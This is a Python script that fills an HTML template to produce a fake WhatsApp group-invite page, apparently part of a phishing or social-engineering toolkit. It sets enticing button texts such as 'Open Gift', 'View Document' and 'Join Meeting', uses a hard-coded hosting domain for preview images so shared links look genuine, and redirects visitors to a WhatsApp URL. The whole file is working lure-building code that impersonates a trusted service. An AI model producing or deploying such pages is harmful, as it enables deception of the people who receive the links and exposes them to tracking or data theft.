#!/usr/bin/env python3

import os
import shutil
import utils

R = '\033[31m' # red
G = '\033[32m' # green
C = '\033[36m' # cyan
W = '\033[0m'  # white

title = os.getenv('TITLE')
image = os.getenv('IMAGE')
redirect = os.getenv('REDIRECT')
desc = os.getenv('DESC')

if not title:
    try:
        title = input(f'{G}[+] {C}Group Title : {W}')
    except Exception:
        title = ''
if not title:
    title = 'Project Updates & Chat'
utils.print(f'{G}[+] {C}Group Title :{W} ' + title)

if not desc:
    try:
        desc = input(f'{G}[+] {C}Description : {W}')
    except Exception:
        desc = ''
if not desc:
    desc = 'WhatsApp Group Invite'
utils.print(f'{G}[+] {C}Description :{W} ' + desc)

if not image:
    try:
        image = input(f'{G}[+] {C}Path to Group Img (Best Size : 300x300): {W}')
    except Exception:
        image = ''
if not image:
    image = 'template/whatsapp_redirect/images/ZIvBTrQd9nP.png'
utils.print(f'{G}[+] {C}Group Image :{W} ' + image)

if not redirect:
    try:
        redirect = input(G + '[+]' + C + ' Enter WhatsApp Group URL : ' + W)
    except Exception:
        redirect = ''
if not redirect:
    redirect = 'https://chat.whatsapp.com'
utils.print(f'{G}[+] {C}WhatsApp Group URL :{W} ' + redirect)

img_name = None
if image.startswith('http'):
    img_name = utils.downloadImageFromUrl(image, 'template/whatsapp_redirect/images/')
    if img_name:
        img_name = img_name.split('/')[-1]

if not img_name:
    img_name = image.split('/')[-1]
    dest = f'template/whatsapp_redirect/images/{img_name}'
    try:
        if os.path.exists(image) and os.path.abspath(image) != os.path.abspath(dest):
            shutil.copyfile(image, dest)
    except Exception as e:
        utils.print('\n' + R + '[-]' + C + ' Warning : ' + W + str(e))
    if not os.path.exists(dest):
        img_name = 'ZIvBTrQd9nP.png'

# Resolve absolute og_image URL for WhatsApp & Facebook scrapers
if image.startswith('http'):
    og_image = image
else:
    og_image = f'https://seeker.riocut.com/images/{img_name}'

img_type = 'image/png' if ((img_name and img_name.lower().endswith('.png')) or image.lower().endswith('.png')) else 'image/jpeg'
site_name = os.getenv('SITENAME') or ('Gift Notification' if 'gift' in title.lower() else 'Chat Group')

btn_text = os.getenv('BTN_TEXT')
if not btn_text:
    if 'gift' in title.lower():
        btn_text = '🎁 Open Gift'
    elif any(w in title.lower() for w in ['document', 'file', 'asset']):
        btn_text = '📄 View Document'
    elif 'meeting' in title.lower() or 'zoom' in title.lower():
        btn_text = '📹 Join Meeting'
    else:
        btn_text = 'Join Chat'
utils.print(f'{G}[+] {C}Button Text :{W} ' + btn_text)

with open('template/whatsapp_redirect/index_temp.html', 'r') as index_temp:
    code = index_temp.read()
    if os.getenv("DEBUG_HTTP"):
        code = code.replace('window.location = "https:" + restOfUrl;', '')
    code = code.replace('$TITLE$', title)
    code = code.replace('$DESC$', desc)
    code = code.replace('$BTN_TEXT$', btn_text)
    code = code.replace('$OG_IMAGE$', og_image)
    code = code.replace('$OG_IMAGE_TYPE$', img_type)
    code = code.replace('$SITE_NAME$', site_name)
    code = code.replace('REDIRECT_URL', redirect)
    code = code.replace('$IMAGE$', 'images/{}'.format(img_name))

with open('template/whatsapp_redirect/index.html', 'w') as new_index:
    new_index.write(code)
